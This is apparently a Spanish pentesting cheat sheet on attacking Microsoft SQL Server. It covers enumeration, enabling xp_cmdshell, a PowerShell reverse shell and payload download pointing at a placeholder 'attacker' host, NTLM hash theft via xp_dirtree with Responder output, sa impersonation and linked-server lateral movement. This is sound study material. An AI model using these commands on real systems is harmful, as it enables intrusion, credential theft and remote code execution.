# MSSQL — Microsoft SQL Server

Microsoft SQL Server es el sistema de gestión de bases de datos de Microsoft, muy común en entornos Windows y aplicaciones .NET. Opera en el puerto **1433** (TCP) por defecto. En entornos con instancias nombradas, usa el puerto **1434** (UDP) para el SQL Server Browser Service, que revela las instancias disponibles.

MSSQL es especialmente interesante en pentests porque tiene funcionalidades integradas que permiten ejecutar comandos del sistema operativo directamente desde consultas SQL.

## Puertos

| Puerto            | Servicio             | Descripción                                            |
| ----------------- | -------------------- | ------------------------------------------------------ |
| `1433` TCP        | MSSQL                | Puerto por defecto de la instancia principal           |
| `1434` UDP        | SQL Server Browser   | Revela instancias disponibles en el servidor           |
| Puertos dinámicos | Instancias nombradas | Las instancias adicionales usan puertos TCP aleatorios |

## Enumeración

### Nmap

```bash
# Detección básica
nmap -sV -p 1433 target
nmap -sU -p 1434 target              # SQL Server Browser

# Scripts específicos
nmap -sC -sV -p 1433 target
nmap --script ms-sql-info,ms-sql-config,ms-sql-dump-hashes -p 1433 target
nmap --script ms-sql-brute -p 1433 target
nmap --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=contraseña -p 1433 target

# Instancias en la red
nmap --script ms-sql-info -p 1433,1434 -sU -sV target
```

### impacket-mssqlclient

`mssqlclient.py` de Impacket es la herramienta más usada para conectarse a MSSQL en pentests:

```bash
# Con usuario SQL (autenticación SQL)
impacket-mssqlclient usuario:contraseña@target

# Con autenticación de Windows (Integrated Security)
impacket-mssqlclient DOMINIO/usuario:contraseña@target -windows-auth

# Con hash NTLM (Pass-the-Hash)
impacket-mssqlclient DOMINIO/usuario@target -hashes :NTLM_HASH -windows-auth

# Especificar base de datos
impacket-mssqlclient usuario:contraseña@target -db nombre_db
```

### Otros clientes

```bash
# sqsh (cliente MSSQL para Linux)
sqsh -S target -U usuario -P contraseña

# Desde Windows: sqlcmd
sqlcmd -S target -U usuario -P contraseña

# Con Metasploit
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target
set USERNAME sa
set PASSWORD contraseña
run
```

### Enumeración dentro de MSSQL

```sql
-- Información del servidor
SELECT @@version;
SELECT @@servername;
SELECT @@servicename;
SELECT SYSTEM_USER;          -- usuario actual de la conexión SQL
SELECT USER_NAME();          -- usuario de la base de datos actual
SELECT IS_SRVROLEMEMBER('sysadmin');    -- ¿el usuario actual es sysadmin?

-- Bases de datos
SELECT name FROM master..sysdatabases;
USE nombre_db;
SELECT name FROM sysobjects WHERE type = 'U';    -- tablas de usuario
SELECT name, colid FROM syscolumns WHERE id = OBJECT_ID('tabla');

-- Usuarios y privilegios
SELECT name, sysadmin FROM master..syslogins;
SELECT name FROM sys.server_principals WHERE type IN ('S', 'U', 'G');
EXEC sp_helplogins;
EXEC sp_helpuser;

-- Configuración del servidor
EXEC sp_configure;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure;    -- ver todas las opciones incluyendo las avanzadas

-- Linked servers (servidores enlazados)
EXEC sp_linkedservers;
SELECT name FROM sys.servers WHERE is_linked = 1;
```

## Ataques

### xp\_cmdshell — ejecución de comandos del sistema

`xp_cmdshell` es un procedimiento almacenado extendido de MSSQL que permite ejecutar comandos del sistema operativo directamente desde una consulta SQL. Es la forma más directa de obtener RCE desde MSSQL.

```sql
-- Ver si xp_cmdshell está activo
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Activar xp_cmdshell (requiere privilegios de sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Ejecutar comandos
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';

-- Reverse shell con PowerShell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\"attacker\",4444);..."';
```

Con `impacket-mssqlclient`, el comando `enable_xp_cmdshell` activa el procedimiento y `xp_cmdshell whoami` lo usa directamente en la shell interactiva.

### Lectura y escritura de archivos

```sql
-- Leer archivos (requiere privilegios)
-- Usando BULK INSERT o OPENROWSET

-- Escribir archivos con xp_cmdshell
EXEC xp_cmdshell 'echo "contenido" > C:\ruta\archivo.txt';
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker/payload.exe -OutFile C:\Windows\Temp\payload.exe"';
```

### Capturar el hash del servicio MSSQL

Para hacer el robo de hashes tenemos que tener activado Responder en otra terminal esperando.

```bash
pyrhos@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...
```

o también podemos capturar el hash con impacket

```bash
pyrhos@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

#### Robo de hash con xp\_dirtree

```sql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

#### Robo de hash con xp\_subdirs

```sql
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

Despues de haber ejecutado una de estas 2 opciones en el responder nos saldra el hash

```bash
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

### Suplantación de usuarios&#x20;

SQL Server tiene un permiso especial, llamado `IMPERSONATE`, que permite al usuario en ejecución asumir los permisos de otro usuario o iniciar sesión hasta que se restablezca el contexto o finalice la sesión.

**Identificar usuarios que podemos suplantar**

```cmd
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

**Verificación de nuestro usuario y rol actual**

```cmd
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

**Hacerse pasar por otro usuario**

```cmd
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

> Es recomendable correr `EXECUTE AS LOGIN` dentro de la base de datos maestra, porque todos los usuarios, por defecto, tienen acceso a esa base de datos.&#x20;
>
> Si un usuario que estás intentando suplantar no tiene acceso a la base de datos a la que te estás conectando, presentará un error. muevete a la base de datos maestra usando `USE master`.<br>

## Linked Servers — movimiento lateral

Si MSSQL tiene servidores enlazados (_linked servers_), se pueden ejecutar consultas en otros servidores de base de datos usando el contexto de autenticación del enlace:

```sql
-- Ver servidores enlazados
EXEC sp_linkedservers;

-- Ejecutar consulta en servidor enlazado
SELECT * FROM OPENQUERY([servidor_enlazado], 'SELECT @@version');

-- Ejecutar xp_cmdshell en servidor enlazado
EXEC ('xp_cmdshell ''whoami''') AT [servidor_enlazado];
```

## Riesgos y misconfiguraciones

| Riesgo                                                 | Descripción                                                                                              |
| ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- |
| **xp\_cmdshell activo**                                | Ejecución directa de comandos del sistema operativo → RCE                                                |
| **Usuario SA con contraseña débil**                    | SA es el superadministrador de MSSQL. Brute force con contraseñas comunes.                               |
| **Autenticación SQL habilitada**                       | Si el servidor acepta autenticación SQL además de Windows, el brute force es más sencillo.               |
| **MSSQL corriendo como LocalSystem o NETWORK SERVICE** | Los comandos ejecutados via xp\_cmdshell se ejecutan en ese contexto. LocalSystem = privilegios máximos. |
| **Linked servers con credenciales**                    | Las credenciales almacenadas en linked servers pueden usarse para movimiento lateral.                    |
| **Acceso desde internet**                              | Puerto 1433 expuesto directamente a internet.                                                            |

> Si `xp_cmdshell` está activo y el proceso de SQL Server corre como `NT AUTHORITY\SYSTEM` (LocalSystem), la ejecución de comandos es directamente como SYSTEM — privilegios máximos en el sistema Windows.

> En entornos de Active Directory, el servicio SQL Server suele correr con una **cuenta de servicio de dominio**. Esas credenciales pueden ser Kerberoasteadas y reutilizadas para movimiento lateral si la contraseña es débil.
